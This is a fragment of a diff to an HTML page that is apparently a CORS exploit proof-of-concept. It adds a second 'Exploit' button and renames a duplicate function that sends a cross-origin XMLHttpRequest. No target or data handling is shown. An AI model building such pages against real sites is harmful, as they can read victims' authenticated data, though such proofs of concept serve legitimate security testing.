@@ -7,7 +7,8 @@
  
 <textarea rows="10" cols="60" id="pwnz">
 </textarea>
-<button type="button" onclick="cors()">Exploit</button>
+<button type="button" onclick="cors()">Exploit1</button>
+<button type="button" onclick="corrs()">Exploit2</button>
 </div>
  
 <script>
@@ -24,8 +25,9 @@ function cors() {
 }
 </script>
 
+
 <script>
-function cors() {
+function corrs() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
